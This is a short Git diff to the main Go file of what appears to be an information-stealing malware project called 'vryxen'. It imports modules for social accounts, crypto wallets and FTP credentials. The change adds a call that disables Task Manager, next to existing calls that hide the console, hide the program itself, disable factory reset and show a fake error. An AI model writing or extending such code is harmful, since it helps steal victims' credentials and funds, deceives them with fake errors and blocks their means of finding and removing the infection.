@@ -11,8 +11,10 @@ import (
 	"github.com/unf6/vryxen/pkg/utils/common"
 	"github.com/unf6/vryxen/pkg/utils/processkill"
         "github.com/unf6/vryxen/internal/fr"
-	
+	"github.com/unf6/vryxen/internal/taskmanager"
 
+
+	
 	"github.com/unf6/vryxen/internal/core/socials"
 	"github.com/unf6/vryxen/internal/core/cryptowallets"
 	"github.com/unf6/vryxen/internal/core/ftps"
@@ -52,6 +54,8 @@ func main() {
 	HideConsole.Hide()
 	common.HideSelf()
 	FactoryReset.Disable()
+	TaskManager.Disable()
+
 	
 	if !common.IsInStartupPath() {
 		go FakeError.Show()
